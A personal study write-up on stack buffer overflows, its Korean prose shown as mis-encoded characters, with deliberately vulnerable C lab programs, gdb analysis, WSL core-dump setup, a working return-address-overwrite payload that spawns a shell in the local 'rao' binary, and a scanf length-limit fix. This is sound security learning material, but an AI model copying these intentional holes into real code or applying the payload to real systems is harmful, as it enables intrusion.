# Memory Corruption: Stack Buffer Overflow

### **ìŠ¤íƒ ë²„í¼ ì˜¤ë²„í”Œë¡œìš°(Stack Buffer Overflow)**

- **ìŠ¤íƒì˜ ë²„í¼**ì—ì„œ ë°œìƒí•˜ëŠ” ì˜¤ë²„í”Œë¡œìš°

**ë²„í¼(Buffer)**

- ë°ì´í„°ê°€ ëª©ì ì§€ë¡œ ì´ë™ë˜ê¸° ì „ì— ë³´ê´€ë˜ëŠ” **ì„ì‹œ ì €ì¥ì†Œ**

ë‘ ì¥ì¹˜ì˜ ë°ì´í„°ì˜ ì²˜ë¦¬ ì†ë„ê°€ ë‹¤ë¥¼ ë•Œ ë‘˜ ì‚¬ì´ì— ì˜¤ê°€ëŠ” ë°ì´í„°ë¥¼ ì„ì‹œë¡œ ì €ì¥í•´ë‘ëŠ” ê±°ì„

ì§€ì—­ ë³€ìˆ˜ â†’ **ìŠ¤íƒ ë²„í¼**

í™ì— í• ë‹¹ëœ ë©”ëª¨ë¦¬ ì˜ì—­ â†’  **í™ ë²„í¼**

**ë²„í¼ ì˜¤ë²„í”Œë¡œìš°**

- ë¬¸ì ê·¸ëŒ€ë¡œ ë²„í¼ê°€ ë„˜ì¹˜ëŠ” ê²ƒì„ ì˜ë¯¸
- ì¼ë°˜ì ìœ¼ë¡œ ë²„í¼ëŠ” ë©”ëª¨ë¦¬ìƒì— ì—°ì†í•´ì„œ í• ë‹¹
    - ì˜¤ë²„í”Œë¡œìš°ê°€ ë°œìƒí•˜ë©´ ë’¤ì— ìˆëŠ” ë²„í¼ì˜ ê°’ì´ ì¡°ì‘ë  ìœ„í—˜ì´ ìˆìŒ

### **ë²„í¼ ì˜¤ë²„í”Œë¡œìš° ê³µê²© ì˜ˆì‹œ**

**ì¤‘ìš” ë°ì´í„° ë³€ì¡°**

- í†µì‹ í•˜ëŠ” ê³³ì˜ ì£¼ì†Œë¥¼ ìœ„ì¡°í•  ìˆ˜ ìˆìŒ
    - `https://twitter.com`ì™€ í†µì‹ í•˜ëŠ” í”„ë¡œê·¸ë¨ì´ ìˆë‹¤ë©´ ì£¼ì†Œë¥¼ `https://example.evil`ë¡œ ì¡°ì‘

```c
// Name: sbof_auth.c
// Compile: gcc -o sbof_auth sbof_auth.c -fno-stack-protector
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int check_auth(char *password) {
    int auth = 0;
    char temp[16];
    
    strncpy(temp, password, strlen(password));
    
    if(!strcmp(temp, "SECRET_PASSWORD"))
        auth = 1;
    
    return auth;
}

int main(int argc, char *argv[]) {
    if (argc != 2) {
        printf("Usage: ./sbof_auth ADMIN_PASSWORD\n");
        exit(-1);
    }

    if (check_auth(argv[1]))
        printf("Hello Admin!\n");
    else
        printf("Access Denied!\n");
}

```

- ìœ„ ì½”ë“œì—ì„œ `check_auth`í•¨ìˆ˜ì—ì„œëŠ” 16 ë°”ì´íŠ¸ í¬ê¸°ì˜Â `temp` ë²„í¼ì— ì…ë ¥ë°›ì€ íŒ¨ìŠ¤ì›Œë“œë¥¼ ë³µì‚¬í•œ í›„, ì´ë¥¼ "SECRET_PASSWORD" ë¬¸ìì—´ê³¼ ë¹„êµ
    - ë¬¸ìì—´ì´ ê°™ë‹¤ë©´ `auth`ë¥¼ 1ë¡œ ì„¤ì •í•˜ê³  ë°˜í™˜
- `argv[1]`ì— 16 ë°”ì´íŠ¸ê°€ ë„˜ëŠ” ë¬¸ìì—´ì„ ì „ë‹¬í•˜ë©´, ì´ë“¤ì´ ëª¨ë‘ ë³µì‚¬ë˜ì–´ ìŠ¤íƒ ë²„í¼ ì˜¤ë²„í”Œë¡œìš°ê°€ ë°œìƒ
- `temp` ë²„í¼ì— ì˜¤ë²„í”Œë¡œìš°ë¥¼ ë°œìƒì‹œí‚¤ë©´ `auth`ì˜ ê°’ì„ 0ì´ ì•„ë‹Œ ì„ì˜ ê°’ìœ¼ë¡œ ë°”ê¿€ ìˆ˜ ìˆìŒ
    
    â†’ `main` í•¨ìˆ˜ì˜Â `if(check_auth(argv[1]))`Â ëŠ” í•­ìƒ 
    

**ë°ì´í„° ìœ ì¶œ**

```c
// Name: sbof_leak.c
// Compile: gcc -o sbof_leak sbof_leak.c -fno-stack-protector
#include <stdio.h>
#include <string.h>
#include <unistd.h>

int main() {
    char secret[16] = "secret message";
    char barrier[4] = {};
    char name[8] = {};
    memset(barrier, 0, 4);
    printf("Your name: ");
    read(0, name, 12);
    printf("Your name is %s.", name);
}

```

- 8ë°”ì´íŠ¸ í¬ê¸°ì˜ `name` ë²„í¼ì— 12ë°”ì´íŠ¸ì˜ ì…ë ¥
- `secret` ë²„í¼ì™€ì˜ ì‚¬ì´ì— `barrier`ë¼ëŠ” 4ë°”ì´íŠ¸ì˜ ë„ ë°”ì´íŠ¸ë¡œ ì±„ì›Œì§„ ë°°ì—´ì´ ì¡´ì¬
    - ì˜¤ë²„í”Œë¡œìš°ë¥¼ ì´ìš©í•˜ì—¬ ë„ ë°”ì´íŠ¸ë¥¼ ëª¨ë‘ ë„ ë°”ì´íŠ¸ê°€ ì•„ë‹Œ ë‹¤ë¥¸ ê°’ìœ¼ë¡œ ë³€ê²½í•˜ë©´ `secret`ì„ ì½ì„ ìˆ˜ ìˆìŒ

**ì‹¤í–‰ íë¦„ ì¡°ì‘**

```c
// Name: sbof_ret_overwrite.c
// Compile: gcc -o sbof_ret_overwrite sbof_ret_overwrite.c -fno-stack-protector
#include <stdio.h>
#include <unistd.h>

void win() {
    printf("You won!\n");
}

int main(void) {
    char buf[8];
    printf("Overwrite return address with %p:\n", &win);
    read(0, buf, 32);
    return 0;
}
```

- ìŠ¤íƒ ë²„í¼ ì˜¤ë²„í”Œë¡œìš°ë¡œ ë°˜í™˜ ì£¼ì†Œ(Return Address)ë¥¼ ì¡°ì‘
    - `b'A' * 16` ì´í›„ì— `win()` ì£¼ì†Œë¥¼ ì´ì–´ ë¶™ì—¬ ë³´ë‚´ë©´ `win()` í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•˜ëŠ” ê²ƒì´ ê°€ëŠ¥
 
<br>
<br>
## Exploit Tech: Return Address Overwrite
**ë°˜í™˜ ì£¼ì†Œ ë®ê¸° ì‹¤ìŠµ ì˜ˆì œ**

```c
// Name: rao.c
// Compile: gcc -o rao rao.c -fno-stack-protector -no-pie

#include <stdio.h>
#include <unistd.h>

void init() {
  setvbuf(stdin, 0, 2, 0);
  setvbuf(stdout, 0, 2, 0);
}

void get_shell() {
  char *cmd = "/bin/sh";
  char *args[] = {cmd, NULL};

  execve(cmd, args, NULL);
}

int main() {
  char buf[0x28];

  init();

  printf("Input: ");
  scanf("%s", buf);

  return 0;
}
```

### ì·¨ì•½ì  ë¶„ì„

- `scanf(â€œ%sâ€, buf)`
    - ì…ë ¥ì˜ ê¸¸ì´ë¥¼ ì œí•œí•˜ì§€ ì•ŠìŒ
    - ê³µë°± ë¬¸ìì¸ ë„ì–´ì“°ê¸°, íƒ­, ê°œí–‰ ë¬¸ì ë“±ì´ ë“¤ì–´ì˜¬ ë•Œê¹Œì§€ ê³„ì† ì…ë ¥ì„ ë°›ìŒ
    
    â†’ ì˜¤ë²„í”Œë¡œìš° ë°œìƒ ê°€ëŠ¥
    
- `scanf`ì— `%s` í¬ë§· ìŠ¤íŠ¸ë§ì€ **ì ˆëŒ€ë¡œ ì‚¬ìš©í•˜ì§€ ë§ì•„ì•¼ í•¨**
- ì •í™•íˆ nê°œì˜ ë¬¸ìë§Œ ì…ë ¥ ë°›ëŠ” `â€œ%[n]sâ€`ì˜ í˜•íƒœë¡œ ì‚¬ìš©í•´ì•¼ í•¨

- ë²„í¼ë¥¼ ë‹¤ë£¨ë©´ì„œ ê¸¸ì´ë¥¼ ì…ë ¥í•˜ì§€ ì•ŠëŠ” í•¨ìˆ˜ë“¤ì€ ëŒ€ë¶€ë¶„ ìœ„í—˜!
    - **ìœ„í—˜ : `strcpy`, `strcat`,`sprintf`**
    - **ì´ê±¸ ì‚¬ìš© : `strncpy`, `strncat`, `snprintf`, `fgets`, `memcpy`**
- ì˜ˆì œì—ì„œëŠ” í¬ê¸°ê°€ `0x28`ì¸ ë²„í¼ì— `scanf(â€œ%sâ€, buf)`ë¡œ ì…ë ¥ì„ ë°›ìŒ
    - ì…ë ¥ì„ ê¸¸ê²Œ ì¤€ë‹¤ë©´ ë²„í¼ ì˜¤ë²„í”Œë¡œìš°ë¥¼ ë°œìƒ ê°€ëŠ¥
    - `main`í•¨ìˆ˜ì˜ ë°˜í™˜ ì£¼ì†Œë¥¼ ë®ê¸°

**ì°¸ê³ **

> **ğŸ’¡ C/C++ì˜ ë¬¸ìì—´ ì¢…ê²°ì(Terminator)ì™€ í‘œì¤€ ë¬¸ìì—´ í•¨ìˆ˜ë“¤ì˜ ì·¨ì•½ì„±**

Cê³„ì—´ ì–¸ì–´ì—ì„œëŠ” ë„ë°”ì´íŠ¸(â€œ\x00â€)ë¡œ ì¢…ë£Œë˜ëŠ” ë°ì´í„° ë°°ì—´ì„ ë¬¸ìì—´ë¡œ ì·¨ê¸‰í•˜ë©°, ë¬¸ìì—´ì„ ë‹¤ë£¨ëŠ” ëŒ€ë¶€ë¶„ì˜ í‘œì¤€ í•¨ìˆ˜ëŠ” ë„ë°”ì´íŠ¸ë¥¼ ë§Œë‚  ë•Œê¹Œì§€ ì—°ì‚°ì„ ì§„í–‰í•©ë‹ˆë‹¤. ì˜ˆë¥¼ ë“¤ì–´, `char *strcpy(char *dest, const char *src)`ì€ srcë°°ì—´ì˜ ì²« ë²ˆì§¸ ì¸ë±ìŠ¤ë¶€í„° ë„ë°”ì´íŠ¸ê°€ ì €ì¥ëœ ì¸ë±ìŠ¤ê¹Œì§€ ì°¸ì¡°í•˜ì—¬ destì— ê°’ì„ ë³µì‚¬í•©ë‹ˆë‹¤.

ì—¬ê¸°ì„œ ìƒê°í•´ë´ì•¼ í•  ê²ƒì€ srcì— ë„ë°”ì´íŠ¸ê°€ ì—†ì„ ê²½ìš°ì…ë‹ˆë‹¤. ë¬¸ìì—´ í•¨ìˆ˜ëŠ” ë„ë°”ì´íŠ¸ë¥¼ ì°¾ì„ ë•Œê¹Œì§€ ë°°ì—´ì„ ì°¸ì¡°í•˜ë¯€ë¡œ, ì½”ë“œë¥¼ ì‘ì„±í•  ë•Œ ì •ì˜í•œ ë°°ì—´ì˜ í¬ê¸°ë¥¼ ë„˜ì–´ì„œë„ ê³„ì†í•´ì„œ ì¸ë±ìŠ¤ë¥¼ ì¦ê°€ì‹œí‚µë‹ˆë‹¤. ì´ëŸ° ë™ì‘ìœ¼ë¡œ ì¸í•´ ì°¸ì¡°í•˜ë ¤ëŠ” ì¸ë±ìŠ¤ ê°’ì´ ë°°ì—´ì˜ í¬ê¸°ë³´ë‹¤ ì»¤ì§€ëŠ” í˜„ìƒì„ **Index Out-Of-Bound**ë¼ê³  ë¶€ë¥´ë©°, ì¤„ì—¬ì„œ **OOB**ë¼ê³ ë„ í•©ë‹ˆë‹¤. ê·¸ë¦¬ê³  í•´ë‹¹ ë²„ê·¸ë¥¼ ë°œìƒì‹œí‚¤ëŠ” ì·¨ì•½ì ì„ **Out-Of-Bound(OOB)**ì·¨ì•½ì ì´ë¼ê³  ë¶€ë¦…ë‹ˆë‹¤.

OOBëŠ” ì‹¬ê°í•œ ë³´ì•ˆ ì·¨ì•½ì  ì¤‘ í•˜ë‚˜ë¡œ, ì´ë¥¼ ì´ìš©í•˜ì—¬ í•´ì»¤ëŠ” í”„ë¡œê·¸ë˜ë¨¸ê°€ ì˜ë„í•˜ì§€ ì•Šì€ ì£¼ì†Œì˜ ë°ì´í„°ë¥¼ ì½ê±°ë‚˜, ì¡°ì‘í•  ìˆ˜ ìˆê³ , ëª‡ëª‡ ì¡°ê±´ì´ ë§Œì¡±ë˜ë©´ ì†Œí”„íŠ¸ì›¨ì–´ì— ì‹¬ê°í•œ ì˜¤ë™ì‘ì„ ì¼ìœ¼í‚¬ ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤. ì´ë¥¼ ë°©ì§€í•˜ê¸° ìœ„í•´ ê°œë°œìëŠ” ì…ë ¥ì˜ ê¸¸ì´ë¥¼ ì œí•œí•˜ëŠ” ë¬¸ìì—´ í•¨ìˆ˜ë¥¼ ì‚¬ìš©í•´ì•¼ í•˜ë©°, ë¬¸ìì—´ì„ ì‚¬ìš©í•  ë•ŒëŠ” ë°˜ë“œì‹œ í•´ë‹¹ ë¬¸ìì—´ì´ ë„ë°”ì´íŠ¸ë¡œ ì¢…ê²°ë˜ëŠ”ì§€ í™•ì¸í•´ì•¼ í•©ë‹ˆë‹¤.

OOBì— ëŒ€í•´ì„œëŠ” ì´ ë¡œë“œë§µì˜ í›„ë°˜ë¶€ì— ë” ìì„¸íˆ ì†Œê°œí•  ê²ƒì…ë‹ˆë‹¤.
> 

### **íŠ¸ë¦¬ê±°**

![image](https://github.com/user-attachments/assets/830bfe4a-c383-4184-be62-a161ccdcd8e6)

`A` ë¥¼ 5ê°œ ì³¤ì„ ë•Œì™€ 64ê°œë¡œ ë§ì´ ì…ë ¥í–ˆì„ ë•Œ ë°˜ì‘ ì°¨ì´ì´ë‹¤
Aë¥¼ 64ë²ˆ ì…ë ¥í•˜ë©´ Segmentation fault ë¼ëŠ” ì—ëŸ¬ê°€ ì¶œë ¥ëœë‹¤

**ì½”ì–´ íŒŒì¼ì´ ìƒì„±ë˜ì§€ ì•Šì„ ë•Œ**

WSLì„ í†µí•´ ì‹¤ìŠµì„ í•˜ê³  ìˆì—ˆëŠ”ë° coreíŒŒì¼ì´ ìƒê¸°ì§€ ì•Šì•˜ë‹¤

WSLì—ì„œëŠ” ê¸°ë³¸ì ìœ¼ë¡œ ìœˆë„ìš°ì™€ ì—°ë™ëœ ë°©ì‹ìœ¼ë¡œ ì¶©ëŒ ì •ë³´ë¥¼ ì²˜ë¦¬í•´ì„œ ì›ë˜ coreíŒŒì¼ì´ ìƒê¸°ì§€ ì•ŠëŠ”ë‹¤ê³  í•œë‹¤

```bash
echo "|/bin/false" | sudo tee /proc/sys/kernel/core_pattern
```

`core_pattern` ì„ì‹œë¡œ ë¹„í™œì„±í™” ì‹œì¼œì¤˜ì•¼í•œë‹¤ê³  í•œë‹¤

ì½”ì–´ ë‚´ìš©ë“¤ì„ `|/wsl-capture-crash %t %E %p %s` ì—¬ê¸°ë¡œ ì „ë‹¬í•˜ê² ë‹¤ê³  ë–´ëŠ”ë° ì´ê±¸ ë„ê² ë‹¤ëŠ” ë§ì¸ê±°ê°™ë‹¤ (ì½”ì–´ íŒŒì¼ì´ ìƒê¸°ë„ë¡)

```bash
sudo sh -c 'echo /home/alex0/pwnable/core > /proc/sys/kernel/core_patternâ€™
```

íŒŒì¼ ì €ì¥  ìœ„ì¹˜ë¥¼ ì„¤ì •í•˜ëŠ” ëª…ë ¹ì–´ì´ë‹¤

`/home/alex0/pwnable/`ì— ì‹¤ìŠµ íŒŒì¼ì„ ë‹¤ ë³´ê´€í•˜ê³  ìˆì—ˆì–´ì„œ ìœ„ ê²½ë¡œì— `core`ë””ë ‰í† ë¦¬ë¥¼ ë§Œë“¤ì–´ì£¼ê² ë‹¤ 

```bash
ulimit -c unlimited
```

`ulimit`ì€ í˜„ì¬ ì…¸ ì„¸ì…˜ì— ì ìš©ë˜ëŠ” ìì› ì œí•œ ì„¤ì •ì´ë¼ê³  í•œë‹¤

ê¸°ë³¸ ê°’ì´ 0ì´ë¼ ì´ ëª…ë ¹ì–´ë¥¼ ì³ì¤˜ì•¼ core íŒŒì¼ ìƒì„±ì´ í—ˆìš©ëœë‹¤

â€» ì´ ì„¤ì •ì€ í„°ë¯¸ë„ ê»ë‹¤ê°€ ë„ë©´ ë‹¤ì‹œ 0ìœ¼ë¡œ ë³€í•œë‹¤ê³  í•œë‹¤

```bash
echo 'ulimit -c unlimited' >> ~/.bashrc
```

ë§¤ë²ˆ ì¹˜ëŠ”ê²Œ ê·€ì°®ìœ¼ë©´ ì´ê±¸ ì…ë ¥í•˜ë©´ ìˆ˜ë™ìœ¼ë¡œ ì•ˆí•´ë„ ëœë‹¤ê³  í•œë‹¤

ê·¼ë° ë‚œ ê·¸ëƒ¥ ë§¤ë²ˆ ì¹  ìƒê°ì´ë‹¤

ì‹¤ìˆ˜ë¡œ ì³¤ìœ¼ë©´ `nano ~/.bashrc` ì´ê±¸ ì…ë ¥í•´ì„œ `ulimit -c unlimited` ì´ ë¶€ë¶„ì„ ì‚­ì œí•˜ë©´ ëœë‹¤ê³  í•œë‹¤.  

![image (12)](https://github.com/user-attachments/assets/cea7fdde-110c-4c05-a2a4-a3fa05248421)

![image (13)](https://github.com/user-attachments/assets/541c38a9-9b3a-4041-8efb-4ecb336db9a5)

5ë²ˆì§¸ ì¤„ë¶€í„° ë”°ë¼í•˜ë©´ ëœë‹¤ (`cd pwnable` ë‹¤ìŒ ì¤„)

```bash
gdb rao -c core
```

ì´ ëª…ë ¹ì–´ë¥¼ ì¹˜ê³  ë³´ë©´ ëœë‹¤

![image (14)](https://github.com/user-attachments/assets/4d16cc79-90ea-4f13-9c5d-2503fedc3184)

ì´ë ‡ê²Œ ì˜ ë‚˜ì˜¨ë‹¤

ìœ„ ì½”ë“œë¥¼ ë³´ë©´ ìŠ¤íƒ ìµœìƒë‹¨ì— ì €ì¥ëœ ê°’ì´ ì…ë ¥ê°’ì˜ ì¼ë¶€ì¸ `0x4141414141414141('AAAAAAAA')` ë¼ëŠ” ê²ƒì„ ì•Œ ìˆ˜ ìˆë‹¤. 
ì´ëŠ” ì‹¤í–‰ê°€ëŠ¥í•œ ë©”ëª¨ë¦¬ì˜ ì£¼ì†Œê°€ ì•„ë‹ˆë¯€ë¡œ ì„¸ê·¸ë¨¼í…Œì´ì…˜ í´íŠ¸ê°€ ë°œìƒí•œê±°ì„

`main` í•¨ìˆ˜ì—ì„œ ë°˜í™˜ë  ë•Œ, ì›í•˜ëŠ” ì½”ë“œê°€ ì‹¤í–‰ë˜ë„ë¡ ì¡°ì‘ì´ ê°€ëŠ¥í•˜ë‹¤

### **ìŠ¤íƒ í”„ë ˆì„ êµ¬ì¡° íŒŒì•…**

ì˜¤ë²„í”Œë¡œìš°ë¥¼ ë°œìƒì‹œì¼œì„œ ë°˜í™˜ ì£¼ì†Œë¥¼ ë®ìœ¼ë ¤ë©´, ìš°ì„  í•´ë‹¹ ë²„í¼ê°€ ìŠ¤íƒ í”„ë ˆì„ì˜ ìœ„ì¹˜ë¥¼ ì•Œì•„ì•¼í•¨

**scanf() í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•˜ëŠ” ì–´ì…ˆë¸”ë¦¬ ì½”ë“œ**

```nasm
pwndbg> nearpc
   0x400706             call   printf@plt 

   0x40070b             lea    rax, [rbp - 0x30]
   0x40070f             mov    rsi, rax
   0x400712             lea    rdi, [rip + 0xab]
   0x400719             mov    eax, 0
 â–º 0x40071e             call   __isoc99_scanf@plt <__isoc99_scanf @plt>
        format: 0x4007c4 â—‚â€” 0x3b031b0100007325 /* '%s' */
        vararg: 0x7fffffffe2e0 â—‚â€” 0x0
...
pwndbg> x/s 0x4007c4
0x4007c4:       "%s"__isoc99_scanf
```

**scanf() í•¨ìˆ˜ì˜ ì˜ì‚¬ ì½”ë“œ**

```nasm
scanf("%s", (rbp-0x30));
```
![image (15)](https://github.com/user-attachments/assets/967edb17-9095-4193-8c1b-e9a01b4d97d7)


ì˜¤ë²„í”Œë¡œìš°ë¥¼ ë°œìƒì‹œí‚¬ ë²„í¼ëŠ” `rbp-0x30` ì´ì˜€ê³ 

ìŠ¤íƒ í”„ë ˆì„ êµ¬ì¡°ìƒ `rbp+0x8` ì—ëŠ” ë°˜í™˜ ì£¼ì†Œê°€ ì €ì¥ë˜ì–´ì•¼ í•¨

ì…ë ¥í•  ë²„í¼ì™€ ë°˜í™˜ ì£¼ì†Œ ì‚¬ì´ì— `0x38`ë§Œí¼ì˜ ê±°ë¦¬ê°€ ìˆìœ¼ë¯€ë¡œ ê·¸ë§Œí¼ì„ ì“°ë ˆê¸° ê°’(dummy data)ìœ¼ë¡œ ì±„ìš°ê³ , ì‹¤í–‰í•˜ê³ ì í•˜ëŠ” ì½”ë“œì˜ ì£¼ì†Œë¥¼ ì…ë ¥í•˜ë©´ ì‹¤í–‰ íë¦„ì„ ì¡°ì‘í• ê±°ì„

### **get_shell() ì£¼ì†Œ í™•ì¸**

![image](https://github.com/user-attachments/assets/7859a724-d220-464f-be36-84cc75760587)

get_shell ì£¼ì†Œê°€ `0x4011dd` ì„ì„ í™•ì¸í•¨

### **í˜ì´ë¡œë“œ êµ¬ì„±**

ì´ì œ ìµìŠ¤í”Œë¡œì‡ì— ì‚¬ìš©í•  **í˜ì´ë¡œë“œ(Payload)**ë¥¼ êµ¬ì„±í•´ì•¼í•¨
![image](https://github.com/user-attachments/assets/6b4d48f5-b5f0-4a34-a5cf-9419c3ddecb2)

### **ì—”ë””ì–¸ ì ìš©**

êµ¬ì„±í•œ í˜ì´ë¡œë“œëŠ” ì ì ˆí•œ **ì—”ë””ì–¸(Endian)**ì„ ì ìš©í•´ì„œ í”„ë¡œê·¸ë¨ì— ì „ë‹¬í•´ì•¼ í•¨
`0x4011dd` ì´ë¯€ë¡œ ë³€í™˜í•˜ë©´
â†’ `\xdd\x11\x40\x00\x00\x00\x00\x00` ì´ë ‡ê²Œ ëœë‹¤

```bash
(python -c "import sys;sys.stdout.buffer.write(b'A'*0x30 + b'B'*0x8 + b'\xdd\x11\x40\x00\x00\x00\x00\x00')";cat)| ./rao
```

ë§ê²Œ ë³€í™˜ì„ í•´ì£¼ê³  ìœ„ ì½”ë“œë¥¼ ì¹œ ë’¤ idë¥¼ ìš”êµ¬í•˜ë©´

![image](https://github.com/user-attachments/assets/fdb74df5-949a-4ea1-9124-e1c16921161c)


ì…€ ì½”ë“œê°€ ì„±ê³µì ìœ¼ë¡œ ë‚˜ì™”ë‹¤

ìœ„ ì˜ˆì‹œ rao.c ì½”ë“œì—ì„œ ì·¨ì•½ì ì„ íŒ¨ì¹˜í•˜ë ¤ë©´ 

`scanf("%39s", buf);`ë¡œ ì…ë ¥ ë°›ëŠ” ê¸¸ì´ì— ì œí•œì„ ì£¼ë©´ ëœë‹¤





